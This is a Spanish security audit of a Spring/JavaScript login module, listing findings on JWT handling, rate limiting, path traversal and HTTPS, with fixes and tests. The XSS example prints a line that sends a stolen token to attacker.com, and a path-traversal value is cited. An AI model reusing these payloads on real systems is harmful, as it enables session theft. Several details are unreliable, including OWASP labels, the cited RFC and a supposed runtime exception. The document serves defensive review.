# 🔐 AUDITORÍA DE SEGURIDAD - MÓDULO DE LOGIN CENATE
**Realizado:** 2026-01-29
**Estado:** ⚠️ CRÍTICO - Se encontraron vulnerabilidades que requieren corrección inmediata
**Clasificación OWASP:** TOP 10 + adicionales

---

## 📊 RESUMEN EJECUTIVO

| Severidad | Cantidad | Estado |
|-----------|----------|--------|
| 🔴 **CRÍTICA** | 2 | Requiere corrección inmediata |
| 🟠 **ALTA** | 3 | Debe corregirse antes de producción |
| 🟡 **MEDIA** | 4 | Corrección recomendada |
| 🟢 **BAJA** | 2 | Mejoras futuras |
| ✅ **BIEN** | 4 | Implementaciones correctas |

**Riesgo General:** 🔴 **ALTO** - Se recomienda remediar vulnerabilidades críticas antes de deployment

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. ⚠️ JWT Token Reuse sin Validación de Contexto (CRÍTICA)
**Archivo:** `backend/src/main/java/com/styp/cenate/security/filter/JwtAuthenticationFilter.java` (líneas 68-73)
**OWASP:** A01:2021 - Broken Access Control

**Descripción:**
El JWT se valida SOLO por username y expiración. No se revalida el contexto (IP, User-Agent, dispositivo) en cada request. Un atacante que intercepte un token JWT válido puede reutilizarlo desde cualquier ubicación/dispositivo sin detección.

**Código Vulnerable:**
```java
// JwtAuthenticationFilter.java línea 68-73
if (jwtUtil.validateToken(token, userDetails.getUsername())) {
    UsernamePasswordAuthenticationToken authToken =
            new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
    SecurityContextHolder.getContext().setAuthentication(authToken);
    // ❌ NO HAY VALIDACIÓN DE IP/USER-AGENT
}
```

**Impacto:**
- 🔴 **Riesgo:** Robo de sesiones. Un atacante con token interceptado puede acceder como usuario legítimo
- 🔴 **Alcance:** Todos los usuarios del sistema
- 🔴 **Confidencialidad:** ALTA (acceso a datos de pacientes, datos médicos)
- 🔴 **Integridad:** ALTA (modificación de registros médicos)

**Recomendación:**
1. Almacenar hash de IP + User-Agent en `active_sessions` al login
2. En cada request, validar que IP + User-Agent coincidan con la sesión registrada
3. Si no coinciden, invalidar sesión y requerir re-autenticación

**Código de Ejemplo Seguro:**
```java
// Validar token con contexto
if (jwtUtil.validateToken(token, userDetails.getUsername())) {
    String clientIp = request.getRemoteAddr();
    String clientUserAgent = request.getHeader("User-Agent");

    // Obtener sesión registrada
    ActiveSession session = sessionService.findByUsername(username);
    if (session != null && isValidContext(session, clientIp, clientUserAgent)) {
        // Actualizar última actividad
        sessionService.actualizarActividad(session.getSessionId());

        UsernamePasswordAuthenticationToken authToken =
            new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
        SecurityContextHolder.getContext().setAuthentication(authToken);
    } else {
        log.warn("⚠️ SUSPICIOUS: IP or User-Agent mismatch for user: {}", username);
        // Invalidar token
    }
}
```

---

### 2. ⚠️ Método `changePassword` con Firma Inconsistente (CRÍTICA - BUG DE RUNTIME)
**Archivo:**
- Definición: `backend/src/main/java/com/styp/cenate/service/auth/AuthenticationServiceImpl.java` (línea 212)
- Uso: `backend/src/main/java/com/styp/cenate/api/seguridad/AuthController.java` (línea 127)

**OWASP:** A05:2021 - Broken Access Control

**Descripción:**
Hay una **inconsistencia crítica** entre la firma del método y cómo se invoca:

**Definición (4 parámetros):**
```java
// AuthenticationServiceImpl.java línea 212
public void changePassword(String username, String currentPassword, String newPassword, String confirmPassword) {
    // ... validación de confirmPassword en línea 222
    if (!newPassword.equals(confirmPassword)) {
        throw new RuntimeException("La nueva contraseña y su confirmación no coinciden");
    }
}
```

**Invocación (3 parámetros):**
```java
// AuthController.java línea 127
usuarioService.changePassword(username, request.getCurrentPassword(), request.getNewPassword());
// ❌ FALTA EL PARÁMETRO confirmPassword
```

**Impacto:**
- 🔴 **Error de Runtime:** `MethodNotFoundException` - el endpoint falla cuando se intenta cambiar contraseña
- 🔴 **Seguridad:** Usuario no puede actualizar contraseña (nega servicio)
- 🔴 **Validación Débil:** El DTO `ChangePasswordRequest` ya valida las contraseñas en AuthController (línea 122-124), pero el servicio intenta hacerlo de nuevo

**Recomendación:**
Opción A - Simplificar (RECOMENDADO):
```java
// AuthenticationServiceImpl.java
public void changePassword(String username, String currentPassword, String newPassword) {
    Usuario user = usuarioRepository.findByNameUser(username)
            .orElseThrow(() -> new RuntimeException("Usuario no encontrado"));

    if (!passwordEncoder.matches(currentPassword, user.getPassUser())) {
        throw new RuntimeException("La contraseña actual es incorrecta");
    }

    if (passwordEncoder.matches(newPassword, user.getPassUser())) {
        throw new RuntimeException("La nueva contraseña no puede ser igual a la actual");
    }

    if (!isPasswordSecure(newPassword)) {
        throw new WeakPasswordException("La contraseña no cumple requisitos de seguridad");
    }

    user.setPassUser(passwordEncoder.encode(newPassword));
    usuarioRepository.save(user);
}
```

---

## 🟠 VULNERABILIDADES ALTAS

### 3. 🟠 localStorage para Almacenamiento de JWT (XSS VULNERABLE)
**Archivo:**
- Backend: `backend/src/main/java/com/styp/cenate/security/service/JwtUtil.java`
- Frontend: `frontend/src/context/AuthContext.js` (línea 170-171)
- Utilidades: `frontend/src/constants/auth.js` (presumiblemente usa localStorage)

**OWASP:** A07:2021 - Identification and Authentication Failures

**Descripción:**
El token JWT se almacena en `localStorage`, que es **accesible a cualquier JavaScript** (incluyendo scripts maliciosos via XSS).

**Código Vulnerable:**
```javascript
// AuthContext.js línea 170-171
saveToken(jwt);      // Presumiblemente: localStorage.setItem('token', jwt)
saveUser(userData);  // Presumiblemente: localStorage.setItem('user', JSON.stringify(userData))
```

**Impacto:**
- 🟠 **Severidad:** XSS malicioso → robo de token → acceso total a la cuenta del usuario
- 🟠 **Ejemplo Ataque:**
  ```javascript
  // Script malicioso inyectado
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
  ```

**Recomendación:**
1. **Usar Secure HTTP-only Cookies** en lugar de localStorage:
   - Backend: Emitir JWT en cookie `HttpOnly`, `Secure`, `SameSite=Strict`
   - Frontend: Eliminar acceso manual a tokens

2. **Alternativa (si no es posible cambiar a cookies):**
   - Usar SessionStorage en lugar de localStorage
   - Implementar Content Security Policy (CSP) para prevenir XSS
   - Usar tokens de corta duración (15 min) + refresh tokens en httpOnly cookies

**Implementación Segura (Backend):**
```java
// AuthController.java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody AuthRequest request, HttpServletResponse response) {
    AuthResponse authResponse = authenticationService.authenticate(request);

    // Emitir JWT en httpOnly cookie
    ResponseCookie cookie = ResponseCookie
        .from("auth-token", authResponse.getToken())
        .httpOnly(true)
        .secure(true)  // HTTPS only
        .path("/")
        .maxAge(3600)  // 1 hora
        .sameSite("Strict")
        .build();

    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    // Retornar resto de datos sin el token
    return ResponseEntity.ok(Map.of(
        "user", authResponse.getUser(),
        "roles", authResponse.getRoles()
        // ❌ NO incluir token en response
    ));
}
```

---

### 4. 🟠 Sin Rate Limiting en /auth/login (FUERZA BRUTA)
**Archivo:** `backend/src/main/java/com/styp/cenate/api/seguridad/AuthController.java` (línea 44-70)

**OWASP:** A07:2021 - Identification and Authentication Failures

**Descripción:**
No hay rate limiting en el endpoint `/auth/login`. Aunque hay **detección de cuenta bloqueada** (línea 57-59), un atacante puede realizar intentos ilimitados de fuerza bruta contra múltiples usuarios.

**Impacto:**
- 🟠 **Ataque Brute Force:** Millones de intentos por minuto
- 🟠 **DoS:** Saturar sistema con requests de login
- 🟠 **Credential Stuffing:** Probar listas de credenciales comunes

**Recomendación:**
Implementar rate limiting con Spring:

```java
// pom.xml
<dependency>
    <groupId>io.github.bucket4j</groupId>
    <artifactId>bucket4j-core</artifactId>
    <version>7.6.0</version>
</dependency>

// AuthController.java
@PostMapping("/login")
@RateLimit(limit = 5, period = 60, unit = "SECONDS")  // 5 intentos por minuto por IP
public ResponseEntity<?> login(@RequestBody AuthRequest request) {
    // ... código existente
}
```

O usar middleware personalizado:
```java
@Component
public class LoginRateLimitFilter extends OncePerRequestFilter {
    private final RateLimiter rateLimiter = RateLimiter.create(5.0); // 5 req/sec

    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {

        if ("/api/auth/login".equals(request.getRequestURI())) {
            String clientIp = getClientIp(request);

            if (!rateLimiter.tryAcquire()) {
                response.setStatus(429); // Too Many Requests
                response.getWriter().write("Rate limit exceeded");
                return;
            }
        }
        filterChain.doFilter(request, response);
    }
}
```

---

### 5. 🟠 JWT Decoding sin Validación en Frontend (NO SECURE)
**Archivo:** `frontend/src/context/AuthContext.js` (línea 50, 142)

**OWASP:** A07:2021 - Identification and Authentication Failures

**Descripción:**
El frontend usa `decodeJwt()` que **NO valida la firma del token**. Un atacante puede modificar el token sin que sea detectado.

**Código Vulnerable:**
```javascript
// AuthContext.js línea 50, 142
const payload = decodeJwt(token);  // ❌ Decodifica sin validar firma
// La función decodeJwt presumiblemente hace:
function decodeJwt(token) {
    const parts = token.split('.');
    return JSON.parse(atob(parts[1]));  // ❌ Solo decodifica, no valida
}
```

**Impacto:**
- 🟠 **Token Tampering:** Atacante modifica el JWT localmente
  ```
  Original: {"sub":"user1","roles":["USER"]}
  Modificado: {"sub":"user1","roles":["ADMIN"]}
  ```
- 🟠 **Privilege Escalation:** Usuario local se autoasigna roles administrativos

**Recomendación:**
1. **NUNCA confiar en JWT decodificado del frontend**
2. **Validar roles en backend** con `@CheckMBACPermission`
3. **Para el frontend**, usar el JWT decodificado solo para:
   - Mostrar nombre de usuario
   - Ruteo básico (qué página mostrar)
   - **NO para autorización crítica**

```javascript
// AuthContext.js - USO SEGURO
const payload = decodeJwt(token);  // Solo para mostrar nombre
console.log("Usuario:", payload.username);  // ✅ OK - mostrar info

// ❌ MALO:
if (payload.roles.includes("ADMIN")) {
    showAdminPanel();  // Atacante puede modificar esto
}

// ✅ CORRECTO:
const response = await apiClient.get("/admin/dashboard", true);
// Backend valida con @CheckMBACPermission("ADMIN", "VIEW")
if (response.ok) {
    showAdminPanel();  // Solo si backend lo permite
}
```

---

## 🟡 VULNERABILIDADES MEDIA

### 6. 🟡 Permisos MBAC Comentados/Deshabilitados
**Archivo:** `backend/src/main/java/com/styp/cenate/service/auth/AuthenticationServiceImpl.java` (líneas 78-88)

**OWASP:** A01:2021 - Broken Access Control

**Descripción:**
El código de extracción de permisos está comentado, por lo que **siempre retorna `null`** para permisos.

```java
// AuthenticationServiceImpl.java líneas 78-88
// Permisos MBAC
//
// var permisos = permisosService.obtenerPermisosPorUsuario(user.getIdUser())
//         .stream()
//         .map(PermisoUsuarioResponseDTO::getRutaPagina)
//         .distinct()
//         .collect(Collectors.toList());
// log.info("Cantidad de Permisos : " + permisos.size());

// ...
claims.put("permisos", null);  // ❌ SIEMPRE null
```

**Impacto:**
- 🟡 **Falta Control de Acceso Granular:** Los usuarios no tienen permisos específicos
- 🟡 **Posible Escalación:** Sin permisos granulares, los controles podrían ser débiles

**Recomendación:**
1. Descomentar el código de permisos
2. O confirmar que no se necesita en esta versión (es OK si solo usan roles)

```java
// DESCOMENTO RECOMENDADO:
var permisos = permisosService.obtenerPermisosPorUsuario(user.getIdUser())
    .stream()
    .map(PermisoUsuarioResponseDTO::getRutaPagina)
    .distinct()
    .collect(Collectors.toList());
log.info("Permisos del usuario {}: {}", user.getNameUser(), permisos.size());

claims.put("permisos", permisos);  // ✅ Incluir permisos reales
```

---

### 7. 🟡 Path Traversal Potencial en URL Encoding de Fotos
**Archivo:** `backend/src/main/java/com/styp/cenate/service/auth/AuthenticationServiceImpl.java` (líneas 281-284)

**OWASP:** A01:2021 - Broken Access Control

**Descripción:**
El nombre de la foto se URL-encoda, pero NO se valida que sea un archivo legítimo. Un atacante podría inyectar caracteres especiales.

```java
// AuthenticationServiceImpl.java líneas 281-284
String fotoUrlEncoded = java.net.URLEncoder.encode(fotoPersonalCnt, java.nio.charset.StandardCharsets.UTF_8)
    .replace("+", "%20");
String fotoUrl = "/api/personal/foto/" + fotoUrlEncoded;
// ❌ Si fotoPersonalCnt = "../../../etc/passwd", se construye URL maliciosa
```

**Impacto:**
- 🟡 **Path Traversal:** Acceso a archivos fuera del directorio permitido
- 🟡 **Información Disclosure:** Lectura de archivos confidenciales

**Recomendación:**
Validar que el nombre de archivo es legítimo:

```java
private String obtenerFotoUsuario(Long userId) {
    String fotoPersonalCnt = jdbcTemplate.queryForObject(
        "SELECT foto_pers FROM public.dim_personal_cnt WHERE id_usuario = ? AND foto_pers IS NOT NULL",
        String.class,
        userId
    );

    if (fotoPersonalCnt != null && !fotoPersonalCnt.trim().isEmpty()) {
        // ✅ VALIDAR que el archivo no intenta path traversal
        if (fotoPersonalCnt.contains("..") || fotoPersonalCnt.contains("/")) {
            log.warn("⚠️ Intento de path traversal detectado: {}", fotoPersonalCnt);
            return null;  // Rechazar archivo malicioso
        }

        String fotoUrlEncoded = java.net.URLEncoder.encode(fotoPersonalCnt, java.nio.charset.StandardCharsets.UTF_8);
        return "/api/personal/foto/" + fotoUrlEncoded;
    }
    return null;
}
```

---

### 8. 🟡 Falta Validación de HTTPS (Config Deployment)
**Archivo:** Toda la aplicación

**OWASP:** A02:2021 - Cryptographic Failures

**Descripción:**
No hay forzamiento de HTTPS ni configuración de seguridad de transporte.

**Impacto:**
- 🟡 **Man-in-the-Middle (MITM):** Interceptar tokens JWT en tránsito
- 🟡 **Credential Theft:** Capturar usuario/contraseña

**Recomendación:**
Agregar en `application.properties` o `application.yml`:

```properties
# application-prod.properties
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=
server.ssl.key-store-type=PKCS12

# Forzar HTTPS - redirigir HTTP a HTTPS
server.servlet.session.cookie.secure=true
server.servlet.session.cookie.http-only=true
server.servlet.session.cookie.same-site=strict
```

O en SecurityConfig:
```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.requiresChannel()
            .anyRequest()
            .requiresSecure();  // Forzar HTTPS
        return http.build();
    }
}
```

---

## 🟢 VULNERABILIDADES BAJAS

### 9. 🟢 Información Sensible en Logs
**Archivo:** `backend/src/main/java/com/styp/cenate/api/seguridad/AuthController.java` (línea 47)

**OWASP:** A09:2021 - Logging and Monitoring Failures

**Descripción:**
Logging de intentos de login con username en texto claro:

```java
// AuthController.java línea 47
log.info("🔐 Intentando autenticación MBAC para usuario: {}", request.getUsername());
// ❌ Username en log (si log se filtra, expone información)
```

**Impacto:**
- 🟢 **Información Disclosure:** Si logs se comprometemeten, usernames expuestos

**Recomendación:**
```java
// ✅ MEJOR: Hash del username o solo registrar evento
log.info("🔐 Intento de autenticación MBAC (usuario: {})",
    request.getUsername().substring(0, 3) + "***");  // Enmascarar

// O:
log.info("🔐 Intento de autenticación MBAC [{}]",
    Integer.toHexString(request.getUsername().hashCode()));
```

---

### 10. 🟢 Sin CSRF Protection Visible
**Archivo:** `frontend/src/pages/Login.js`

**OWASP:** A01:2021 - Broken Access Control (CSRF)

**Descripción:**
No hay verificación de tokens CSRF en formularios (aunque POST es mejor que GET).

**Impacto:**
- 🟢 **CSRF bajo** en este contexto (POST endpoint es más seguro)

**Recomendación:**
Spring Boot 6+ incluye CSRF por defecto. Confirmar configuración:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf()
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse());
            // ✅ CSRF automático para POST
        return http.build();
    }
}
```

---

## ✅ IMPLEMENTACIONES SEGURAS

### 11. ✅ Account Lockout Implementado
**Archivo:** `backend/src/main/java/com/styp/cenate/api/seguridad/AuthController.java` (líneas 57-59)

**Descripción:**
✅ Correctamente implementado bloqueo de cuenta por intentos fallidos.

---

### 12. ✅ JWT Token Blacklist Implementado
**Archivo:** `backend/src/main/java/com/styp/cenate/model/TokenBlacklist.java`

**Descripción:**
✅ Tokens revocados se almacenan en blacklist y se validan en cada request.

---

### 13. ✅ Session Tracking Completo
**Archivo:** `backend/src/main/java/com/styp/cenate/model/ActiveSession.java`

**Descripción:**
✅ Sesiones activas registran IP, User-Agent, dispositivo, browser, OS.

---

### 14. ✅ Audit Logging para Eventos de Autenticación
**Archivo:** `backend/src/main/java/com/styp/cenate/service/auditlog/AuditLogService.java`

**Descripción:**
✅ Todos los eventos de login/logout se auditan en `segu_audit_log`.

---

## 📋 PLAN DE REMEDIACIÓN

### Fase 1: CRÍTICO (Semana 1)
- [ ] **1. Implementar validación de contexto (IP/User-Agent)** en JwtAuthenticationFilter
  - Estimación: 4 horas
  - Archivos: JwtAuthenticationFilter.java, SessionService.java

- [ ] **2. Corregir firma del método changePassword**
  - Estimación: 1 hora
  - Archivos: AuthenticationServiceImpl.java, AuthController.java

### Fase 2: ALTO (Semana 2)
- [ ] **3. Migrar JWT a HTTP-only Cookies**
  - Estimación: 8 horas
  - Archivos: AuthController.java, AuthContext.js, apiClient.js

- [ ] **4. Implementar Rate Limiting en /auth/login**
  - Estimación: 3 horas
  - Archivos: Agregar LoginRateLimitFilter.java

- [ ] **5. Implementar validación de JWT en backend**
  - Estimación: 2 horas
  - Archivos: AuthContext.js (actualizar documentación)

### Fase 3: MEDIA (Semana 3)
- [ ] **6. Descomentar y validar código de Permisos MBAC**
  - Estimación: 4 horas
  - Archivos: AuthenticationServiceImpl.java

- [ ] **7. Agregar validación de path traversal en fotos**
  - Estimación: 2 horas
  - Archivos: AuthenticationServiceImpl.java

- [ ] **8. Configurar HTTPS forzado**
  - Estimación: 1 hora
  - Archivos: application.properties, SecurityConfig.java

### Fase 4: BAJO (Demanda)
- [ ] **9. Enmascarar usernames en logs**
  - Estimación: 30 min
  - Archivos: AuthController.java

- [ ] **10. Validar CSRF (ya configurado en Spring)**
  - Estimación: 30 min
  - Archivos: SecurityConfig.java

---

## 🧪 TESTING DE SEGURIDAD

### Test Cases Recomendados

```java
// JwtAuthenticationFilterTest.java
@Test
void testTokenReuseFromDifferentIP() {
    // Obtener token desde IP 192.168.1.1
    String token = loginAs("user1", "192.168.1.1");

    // Intentar usar mismo token desde IP 192.168.1.2
    request.addHeader("Authorization", "Bearer " + token);
    request.setRemoteAddr("192.168.1.2");

    // ✅ DEBE ser rechazado
    filter.doFilter(request, response, chain);
    assertThat(response.getStatus()).isEqualTo(401);
}

@Test
void testPasswordChangeWithoutValidation() {
    // Intenta cambiar contraseña sin password actual
    ChangePasswordRequest req = new ChangePasswordRequest(null, "NewPass123!@", "NewPass123!@");

    // ✅ DEBE rechazar
    assertThrows(IllegalArgumentException.class, () -> {
        authController.changePassword(req, auth);
    });
}

@Test
void testJwtTamperingDetection() {
    // Obtener JWT válido
    String token = loginAs("user1");

    // Modificar payload localmente
    String[] parts = token.split("\\.");
    String payload = new String(Base64.decode(parts[1]));
    String tamperedPayload = payload.replace("user1", "admin");
    String tamperedToken = parts[0] + "." + Base64.encode(tamperedPayload.getBytes()) + "." + parts[2];

    // ❌ Backend NO debe aceptar token tampered (validación de firma)
    request.addHeader("Authorization", "Bearer " + tamperedToken);

    // ✅ DEBE ser rechazado
    filter.doFilter(request, response, chain);
    assertThat(response.getStatus()).isEqualTo(401);
}
```

---

## 📞 REFERENCIAS

- **OWASP Top 10 2021:** https://owasp.org/Top10/
- **JWT Best Practices:** https://tools.ietf.org/html/rfc8949
- **Spring Security:** https://spring.io/projects/spring-security
- **PortSwigger JWT Attacks:** https://portswigger.net/research/jwt-attacks-101

---

**Auditado por:** @security-auditor
**Fecha:** 2026-01-29
**Próxima revisión:** 2026-02-28
**Estado:** 🔴 REQUIERE CORRECCIÓN INMEDIATA
